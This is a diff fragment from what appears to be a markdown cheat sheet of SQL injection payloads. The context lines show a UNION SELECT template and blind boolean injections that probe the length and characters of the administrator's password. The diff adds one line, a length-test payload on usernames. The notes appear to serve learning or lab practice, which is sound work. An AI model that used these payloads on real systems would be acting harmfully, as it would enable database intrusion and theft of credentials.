@@ -175,6 +175,8 @@ and 1=2 union select null,null,[column name here],null from [table name here]
 ' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -
 
 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -
+
+' or LENGTH(username)<=7
 ```
 
 ### Blind SQL injection with conditional errors (No visible message)
